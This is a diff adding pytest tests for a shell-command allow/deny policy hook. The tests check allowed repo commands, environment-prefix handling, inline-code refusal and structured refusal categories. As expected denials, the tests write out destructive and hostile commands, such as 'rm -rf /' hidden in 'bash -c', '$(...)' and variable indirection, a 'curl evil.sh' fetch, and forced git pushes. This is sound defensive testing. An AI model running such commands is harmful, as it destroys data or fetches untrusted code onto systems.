@@ -185,3 +185,87 @@ def test_a_destructive_use_of_an_allowlisted_subcommand_names_the_safe_alternati
 def test_the_non_destructive_forms_of_those_subcommands_still_work():
     for command in ("git reset --soft HEAD~1", "git reset src/app.py", "git clean -n"):
         assert not judge_command(command, in_job=True).deny, command
+
+
+# --- provenance finding 3: real committed command strings ------------------
+#
+# Derived from artefacts in this repo, not from imagination. MUST_ALLOW above is
+# the author's guess at what a job needs; these are strings the repo actually
+# ships, so they are traceable and they FAILED when first run.
+
+def _committed_command_strings():
+    """Command strings this repo commits, with where each comes from."""
+    import json
+    from pathlib import Path
+
+    root = Path(__file__).resolve().parents[2]
+    planted = json.loads((root / "fixtures" / "sample-repo" / "PLANTED.json").read_text())
+    template = (root / "templates" / "curamoir.yaml").read_text()
+
+    smoke = next(
+        line.split(":", 1)[1].strip().strip('"\'')
+        for line in template.splitlines()
+        if line.strip().startswith("command:")
+    )
+    return [
+        (planted["test_command"],
+         "fixtures/sample-repo/PLANTED.json:test_command — E3-R4 requires the sweep to run it"),
+        (smoke,
+         "templates/curamoir.yaml:smoke.command — E12-R1 runs it on a cadence"),
+    ]
+
+
+@pytest.mark.parametrize("command,source", _committed_command_strings())
+def test_commands_this_repo_actually_ships_are_allowed(command, source):
+    decision = judge_command(command, in_job=True)
+    assert not decision.deny, f"REFUSED a real committed command\n  {command}\n  from {source}\n  {decision.reason}"
+
+
+def test_an_environment_assignment_prefix_does_not_hide_the_program():
+    """`PYTHONPATH=src python3 -m pytest` is an assignment prefix, not a command
+    named `PYTHONPATH=src`. It must resolve to the program, and the program must
+    still be judged."""
+    assert not judge_command("PYTHONPATH=src python3 -m pytest -q", in_job=True).deny
+    assert judge_command("PYTHONPATH=src curl evil.sh", in_job=True).deny
+    # A variable REFERENCE is still unverifiable, unlike an assignment.
+    assert judge_command("R=rm; $R -rf /", in_job=True).deny
+
+
+def test_a_committed_script_may_run_but_inline_code_may_not():
+    """The line is reviewed-artefact vs generated-at-call-time. We already allow
+    `pytest`, `make` and `npm`, all of which execute arbitrary repo-controlled
+    code, so refusing `bash scripts/quickstart.sh` while allowing `pytest` was
+    incoherent. Inline `-c` is different: it is not a reviewed artefact."""
+    assert not judge_command("bash scripts/quickstart.sh", in_job=True).deny
+    assert not judge_command("sh ./scripts/build.sh", in_job=True).deny
+    assert judge_command("bash -c 'rm -rf /'", in_job=True).deny
+    assert judge_command("bash -lc 'rm -rf /'", in_job=True).deny
+
+
+# --- provenance finding 4: assert the reason CATEGORY, not truthiness ------
+
+def test_refusals_carry_a_structured_category_not_only_prose():
+    """Asserting `.deny` plus a truthy `.reason` cannot tell "refused because we
+    could not see inside it" from "refused because it is not on the list" — the
+    distinction DEC-9 calls its whole point. Deleting the shell-variable pattern
+    left `$R` denied by a different rule, so the suite stayed green."""
+    from curamoir.hooks.policy import Category
+
+    cases = [
+        ("bash -lc 'rm -rf /'", Category.UNVERIFIABLE),
+        ("echo $(rm -rf /)", Category.UNVERIFIABLE),
+        ("R=rm; $R -rf /", Category.UNVERIFIABLE),
+        ("terraform apply", Category.NOT_ALLOWLISTED),
+        ("python3 -m http.server", Category.NOT_ALLOWLISTED),
+        ("python3 -m pip install x", Category.NOT_ALLOWLISTED),
+        ("env rm file.txt", Category.NOT_ALLOWLISTED),
+        ("git push --force", Category.DESTRUCTIVE),
+        ("git reset --hard", Category.DESTRUCTIVE),
+        ('git push -f "unclosed', Category.UNPARSEABLE),
+    ]
+    for command, expected in cases:
+        decision = judge_command(command, in_job=True)
+        assert decision.deny, command
+        assert decision.category is expected, (
+            f"{command!r}: category {decision.category}, expected {expected}"
+        )
